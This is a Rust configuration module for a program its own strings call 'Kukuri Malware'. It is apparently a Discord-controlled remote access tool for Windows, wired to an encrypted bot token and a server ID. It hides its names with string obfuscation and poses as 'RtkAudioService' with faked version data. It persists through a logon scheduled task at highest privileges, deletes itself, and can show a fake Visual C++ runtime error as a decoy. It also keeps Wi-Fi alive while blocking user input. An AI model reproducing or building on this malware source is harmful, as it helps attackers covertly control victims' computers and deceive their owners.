use std::collections::HashSet;
use twilight_model::id::{marker::GuildMarker, Id};

// Config Structures
// ------------------------------------------------
pub struct KeepActiveConfig {
    pub enabled: bool,
    pub interval_seconds: u64,
}

pub struct WifiMonitorConfig {
    pub enabled: bool,
    pub check_interval_ms: u64,
    pub re_enable_delay_seconds: u64,
    pub block_user_input: bool,
}

pub struct StartupConfig {
    pub enabled: bool,
    pub task_name: String,
    pub on_logon: bool,
    pub highest_privileges: bool,
}

pub struct AutoDeleteConfig {
    pub enabled: bool,
    pub delay_ms: u64,
}

#[allow(dead_code)]
pub enum MessageBoxIcon {
    Error,
    Warning,
    Info,
    Question,
}

#[allow(dead_code)]
pub enum MessageBoxButtons {
    Ok,
    OkCancel,
    YesNo,
}

pub struct DecoyConfig {
    pub enabled: bool,
    pub title: String,
    pub message: String,
    pub icon: MessageBoxIcon,
    pub buttons: MessageBoxButtons,
}

#[allow(dead_code)]
pub struct BuildInfo {
    pub file_name: String,
    pub product_name: String,
    pub description: String,
    pub company_name: String,
    pub file_version: String,
}

// Obfuscated Strings Module
// ------------------------------------------------
mod encrypted_strings {
    #[inline(always)]
    pub fn file_name() -> String {
        obfstr::obfstr!("Kukuri.exe").to_string()
    }

    #[inline(always)]
    pub fn product_name() -> String {
        obfstr::obfstr!("Kukuri Malware").to_string()
    }

    #[inline(always)]
    pub fn description() -> String {
        obfstr::obfstr!("Host Proc for Kurinium").to_string()
    }

    #[inline(always)]
    pub fn company_name() -> String {
        obfstr::obfstr!("Kuri").to_string()
    }

    #[inline(always)]
    pub fn file_version() -> String {
        obfstr::obfstr!("67.0.19041.67").to_string()
    }

    #[inline(always)]
    pub fn task_name() -> String {
        obfstr::obfstr!("RtkAudioService").to_string()
    }

    #[inline(always)]
    pub fn decoy_title() -> String {
        obfstr::obfstr!("Microsoft Visual C++ Runtime Library").to_string()
    }

    #[inline(always)]
    pub fn decoy_message() -> String {
        obfstr::obfstr!("Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call").to_string()
    }

    #[inline(always)]
    pub fn appdata_locallow() -> String {
        obfstr::obfstr!("AppData\\LocalLow").to_string()
    }
}


// Config Implementation
// ------------------------------------------------
pub struct Config;

include!(concat!(env!("OUT_DIR"), "/encrypted_token.rs"));
const DISCORD_TOKEN_DEV: &str = "";

impl Config {
    pub const GUILD_ID: u64 = 1419632444734181471;
    pub const BOT_PREFIX: &'static str = ".";
    pub const MAX_FILE_SIZE_MB: f64 = 10.0;

    // === Build Info ===
    // ------------------------------------------------
    #[inline(always)]
    pub fn file_name() -> String {
        encrypted_strings::file_name()
    }

    #[inline(always)]
    pub fn product_name() -> String {
        encrypted_strings::product_name()
    }

    #[inline(always)]
    pub fn description() -> String {
        encrypted_strings::description()
    }

    #[inline(always)]
    pub fn company_name() -> String {
        encrypted_strings::company_name()
    }

    #[inline(always)]
    pub fn file_version() -> String {
        encrypted_strings::file_version()
    }

    // === Startup Config ===
    // ------------------------------------------------
    pub fn get_startup_config() -> StartupConfig {
        StartupConfig {
            enabled: true,
            task_name: encrypted_strings::task_name(),
            on_logon: true,
            highest_privileges: true,
        }
    }

    pub fn get_autodelete_config() -> AutoDeleteConfig {
        AutoDeleteConfig {
            enabled: true, // Set to false to disable autodelete
            delay_ms: 1000,
        }
    }

    // === Decoy Config ===
    // ------------------------------------------------
    pub fn get_decoy_config() -> DecoyConfig {
        DecoyConfig {
            enabled: false, // Will be replaced by build.ps1
            title: encrypted_strings::decoy_title(),
            message: encrypted_strings::decoy_message(),
            icon: MessageBoxIcon::Error,
            buttons: MessageBoxButtons::Ok,
        }
    }

    // === Paths ===
    // ------------------------------------------------
    pub fn get_appdata_locallow() -> String {
         encrypted_strings::appdata_locallow()
    }

    pub fn get_auth_config() -> AuthConfig {
        AuthConfig {
            auth_roles: false,
            allowed_roles: HashSet::from([]),
            auth_user: false,
            allowed_users: HashSet::from([]),
            auth_all: true,
        }
    }

    pub fn get_keep_active_config() -> KeepActiveConfig {
        KeepActiveConfig {
            enabled: true,
            interval_seconds: 60,
        }
    }

    pub fn get_wifi_monitor_config() -> WifiMonitorConfig {
        WifiMonitorConfig {
            enabled: true,
            check_interval_ms: 500,
            re_enable_delay_seconds: 3,
            block_user_input: true,
        }
    }

    pub fn get_build_info() -> BuildInfo {
        BuildInfo {
            file_name: encrypted_strings::file_name(),
            product_name: encrypted_strings::product_name(),
            description: encrypted_strings::description(),
            company_name: encrypted_strings::company_name(),
            file_version: encrypted_strings::file_version(),
        }
    }

    pub fn get_guildid() -> Id<GuildMarker> {
        Id::new(Self::GUILD_ID)
    }

    pub fn get_token() -> String {
        let decrypted = crate::utils::token::decrypt_token(ENCRYPTED_TOKEN, BUILD_SIGNATURE);
        if decrypted.contains("kurinium-bot") {
            DISCORD_TOKEN_DEV.to_string()
        } else {
            decrypted
        }
    }

    pub fn get_exe_name() -> String {
        Self::get_build_info().file_name
    }

    pub fn get_max_bfilesize() -> usize {
        (Self::MAX_FILE_SIZE_MB * 1024.0 * 1024.0) as usize
    }
}

#[derive(Debug, Clone)]
pub struct AuthConfig {
    pub auth_roles: bool,
    pub allowed_roles: HashSet<String>,
    pub auth_user: bool,
    pub allowed_users: HashSet<String>,
    pub auth_all: bool,
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            auth_roles: false,
            allowed_roles: HashSet::new(),
            auth_user: false,
            allowed_users: HashSet::new(),
            auth_all: true,
        }
    }
}

#[cfg(debug_assertions)]
impl Config {
    pub const SHOW_CONSOLE: bool = true;
}

#[cfg(not(debug_assertions))]
impl Config {
    pub const SHOW_CONSOLE: bool = true;
}